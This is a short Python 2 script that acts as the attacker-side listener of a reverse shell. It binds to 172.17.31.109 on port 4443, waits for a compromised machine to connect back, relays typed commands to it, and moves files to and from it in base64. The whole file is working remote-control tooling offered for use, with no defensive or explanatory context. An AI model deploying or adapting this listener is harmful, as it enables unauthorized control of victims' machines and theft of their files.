#!/usr/bin/env python

import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for a connection.")
        self.connection, address = listener.accept()
        print ("[+] Successfully connected to " + str(address))

    def reliable_send(self, dat):
        json_dat = json.dumps(dat)
        self.connection.send(json_dat)

    def reliable_recv(self):
        json_dat = ""
        while True:
            try:
                json_dat = json_dat + self.connection.recv(1024)
                return json.loads(json_dat)

            except ValueError:
                continue

    def execute(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_recv()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download complete."
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input("->")
            command = command.split(" ")

            try:

                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute(command)

                if command[0] == "download" and "[-] Wrong" not in result:
                    result = self.write_file(command[1], result)

            except Exception:
                result = "[-] Wrong input dude !"

            print(result)


ip = "172.17.31.109"
port = 4443
listen_to = Listener(ip, port)
listen_to.run()